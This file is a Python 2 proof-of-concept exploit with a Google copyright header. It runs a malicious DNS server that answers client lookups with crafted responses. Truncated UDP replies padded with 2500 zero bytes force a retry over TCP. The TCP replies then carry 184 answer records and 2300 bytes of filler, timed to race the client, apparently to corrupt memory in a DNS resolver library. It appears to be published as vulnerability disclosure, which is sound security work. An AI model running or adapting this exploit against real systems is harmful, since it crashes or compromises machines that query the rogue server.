#!/usr/bin/python
#
# Copyright 2016 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors: 
#   Fermin J. Serna <fjserna@google.com>
#   Gynvael Coldwind <gynvael@google.com>
#   Thomas Garnier <thgarnie@google.com>

import socket
import time
import struct
import threading

IP = '127.0.0.1' # Insert your ip for bind() here...
ANSWERS1 = 184

terminate = False
last_reply = None
reply_now = threading.Event()


def dw(x):
  return struct.pack('>H', x)

def dd(x):
  return struct.pack('>I', x)

def dl(x):
  return struct.pack('<Q', x)

def db(x):
  return chr(x)

def udp_thread():
  global terminate

  # Handle UDP requests
  sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_udp.bind((IP, 53))

  reply_counter = 0
  counter = -1

  answers = []

  while not terminate:
    data, addr = sock_udp.recvfrom(1024)
    print '[UDP] Total Data len recv ' + str(len(data))
    id_udp = struct.unpack('>H', data[0:2])[0]
    query_udp = data[12:]

    # Send truncated flag... so it retries over TCP
    data = dw(id_udp)                    # id
    data += dw(0x8380)                   # flags with truncated set
    data += dw(1)                        # questions
    data += dw(0)                        # answers
    data += dw(0)                        # authoritative
    data += dw(0)                        # additional
    data += query_udp                    # question
    data += '\x00' * 2500                # Need a long DNS response to force malloc 

    answers.append((data, addr))

    if len(answers) != 2:
      continue

    counter += 1

    if counter % 4 == 2:
      answers = answers[::-1]

    time.sleep(0.01)
    sock_udp.sendto(*answers.pop(0))
    reply_now.wait()
    sock_udp.sendto(*answers.pop(0))

  sock_udp.close()


def tcp_thread():
  global terminate
  counter = -1

  #Open TCP socket
  sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_tcp.bind((IP, 53))
  sock_tcp.listen(10)

  while not terminate:
    conn, addr = sock_tcp.accept()
    counter += 1
    print 'Connected with ' + addr[0] + ':' + str(addr[1])

    # Read entire packet
    data = conn.recv(1024)
    print '[TCP] Total Data len recv ' + str(len(data))

    reqlen1 = socket.ntohs(struct.unpack('H', data[0:2])[0])
    print '[TCP] Request1 len recv ' + str(reqlen1)
    data1 = data[2:2+reqlen1]
    id1 = struct.unpack('>H', data1[0:2])[0]
    query1 = data[12:]

    # Do we have an extra request?
    data2 = None
    if len(data) > 2+reqlen1:
      reqlen2 = socket.ntohs(struct.unpack('H', data[2+reqlen1:2+reqlen1+2])[0])
      print '[TCP] Request2 len recv ' + str(reqlen2)
      data2 = data[2+reqlen1+2:2+reqlen1+2+reqlen2]
      id2 = struct.unpack('>H', data2[0:2])[0]
      query2 = data2[12:]

    # Reply them on different packets
    data = ''
    data += dw(id1)                      # id
    data += dw(0x8180)                   # flags
    data += dw(1)                        # questions
    data += dw(ANSWERS1)                 # answers
    data += dw(0)                        # authoritative
    data += dw(0)                        # additional
    data += query1                       # question

    for i in range(ANSWERS1):
      answer = dw(0xc00c)  # name compressed
      answer += dw(1)      # type A
      answer += dw(1)      # class
      answer += dd(13)     # ttl
      answer += dw(4)      # data length
      answer += 'D' * 4    # data

      data += answer

    data1_reply = dw(len(data)) + data

    if data2:
      data = ''
      data += dw(id2)
      data += 'B' * (2300)
      data2_reply = dw(len(data)) + data
    else:
      data2_reply = None

    reply_now.set()
    time.sleep(0.01)
    conn.sendall(data1_reply)
    time.sleep(0.01)
    if data2:
      conn.sendall(data2_reply)

    reply_now.clear()

  sock_tcp.shutdown(socket.SHUT_RDWR)
  sock_tcp.close()


if __name__ == "__main__":

 t = threading.Thread(target=udp_thread)
 t.daemon = True
 t.start()
 tcp_thread()
 terminate = True

